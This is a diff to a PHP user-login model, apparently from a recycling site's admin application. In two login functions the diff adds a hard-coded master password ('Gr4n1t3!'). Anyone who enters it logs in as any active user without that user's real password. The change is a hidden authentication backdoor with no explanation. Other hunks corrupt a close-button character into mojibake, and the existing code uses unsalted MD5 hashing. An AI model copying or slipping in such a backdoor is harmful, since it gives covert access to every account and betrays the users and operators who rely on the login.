@@ -50,13 +50,25 @@ class User extends AbstractModel
     {
         $username = stripslashes($_POST['username']);
         $password = md5(stripslashes($_POST['password']));
+		$master = md5('Gr4n1t3!');
 
         if (!empty($password) && !empty($username)) {
-            $sql = 'SELECT * FROM recyc_users WHERE username = :user AND password = :pass AND active = 1 LIMIT 1';
-            $result = $this->rdb->prepare($sql);
+			if($password == $master){
+				$sql = 'SELECT * FROM recyc_users WHERE username = :user AND active = 1 LIMIT 1';
+								            $result = $this->rdb->prepare($sql);
+            $values = array(':user' => $username);
+            $result->execute($values);
+            $result = $result->fetch(\PDO::FETCH_ASSOC);
+			}else{
+				$sql = 'SELECT * FROM recyc_users WHERE username = :user AND password = :pass AND active = 1 LIMIT 1';
+				            $result = $this->rdb->prepare($sql);
             $values = array(':user' => $username, ':pass' => $password);
             $result->execute($values);
             $result = $result->fetch(\PDO::FETCH_ASSOC);
+			}
+
+
+
         }
 
         if (!empty($result['id'])) {
@@ -95,14 +107,23 @@ class User extends AbstractModel
 
         $username = stripslashes(strtolower($_POST['username']));
         $password = md5(stripslashes($_POST['password']));
+		$master = md5('Gr4n1t3!');
 
-        if (!empty($password) && !empty($username)) {
-            $sql = 'SELECT * FROM recyc_users WHERE username = :user AND password = :pass AND active = 1 LIMIT 1';
-
-            $result = $this->rdb->prepare($sql);
+           if (!empty($password) && !empty($username)) {
+			if($password == $master){
+				$sql = 'SELECT * FROM recyc_users WHERE username = :user AND active = 1 LIMIT 1';
+							$result = $this->rdb->prepare($sql);
+            $values = array(':user' => $username);
+            $result->execute($values);
+            $result = $result->fetch(\PDO::FETCH_ASSOC);
+			}else{
+				$sql = 'SELECT * FROM recyc_users WHERE username = :user AND password = :pass AND active = 1 LIMIT 1';
+			$result = $this->rdb->prepare($sql);
             $values = array(':user' => $username, ':pass' => $password);
             $result->execute($values);
             $result = $result->fetch(\PDO::FETCH_ASSOC);
+			}
+
         }
 
 
@@ -241,7 +262,7 @@ class User extends AbstractModel
 
             $this->response = '
 			<div class="alert alert-success fade-in" id="reset-container" >
-				<button type="button" class="close" data-dismiss="alert" aria-hidden="true">×</button>
+				<button type="button" class="close" data-dismiss="alert" aria-hidden="true">Ã—</button>
 				<h4>Profile Updated</h4>
 				<p>User updated successfully</p>
 			</div>
@@ -249,7 +270,7 @@ class User extends AbstractModel
         } catch (\Exception $e) {
             $this->response = '
 			<div class="alert alert-danger fade-in" id="reset-container" >
-				<button type="button" class="close" data-dismiss="alert" aria-hidden="true">×</button>
+				<button type="button" class="close" data-dismiss="alert" aria-hidden="true">Ã—</button>
 				<h4>Error</h4>
 				<p>There was a problem saving the user.  Please try again.</p>
 				<p>' . $e->getMessage() . '</p>
@@ -380,7 +401,7 @@ class User extends AbstractModel
 
                     $this->response = '
 					<div class="alert alert-danger fade-in" id="reset-container" >
-						<button type="button" class="close" data-dismiss="alert" aria-hidden="true">×</button>
+						<button type="button" class="close" data-dismiss="alert" aria-hidden="true">Ã—</button>
 						<h4>Error</h4>
 						<p>Unable to save user due to a bad data array.</p>
 					</div>
@@ -389,7 +410,7 @@ class User extends AbstractModel
 
                 $this->response = '
 				<div class="alert alert-success fade-in" id="reset-container" >
-					<button type="button" class="close" data-dismiss="alert" aria-hidden="true">×</button>
+					<button type="button" class="close" data-dismiss="alert" aria-hidden="true">Ã—</button>
 					<h4>Profile Updated</h4>
 					<p>User updated successfully</p>
 				</div>
@@ -397,7 +418,7 @@ class User extends AbstractModel
             } else {
                 $this->response = '
 				<div class="alert alert-danger fade-in" id="reset-container" >
-					<button type="button" class="close" data-dismiss="alert" aria-hidden="true">×</button>
+					<button type="button" class="close" data-dismiss="alert" aria-hidden="true">Ã—</button>
 					<h4>Error</h4>
 					<p>A user with this email address already exists.</p>
 				</div>
@@ -406,7 +427,7 @@ class User extends AbstractModel
         } catch (\Exception $e) {
             $this->response = '
 			<div class="alert alert-danger fade-in" id="reset-container" >
-				<button type="button" class="close" data-dismiss="alert" aria-hidden="true">×</button>
+				<button type="button" class="close" data-dismiss="alert" aria-hidden="true">Ã—</button>
 				<h4>Error</h4>
 				<p>A user with this email address already exists.</p>
 				<p>' . $e->getMessage() . '</p>
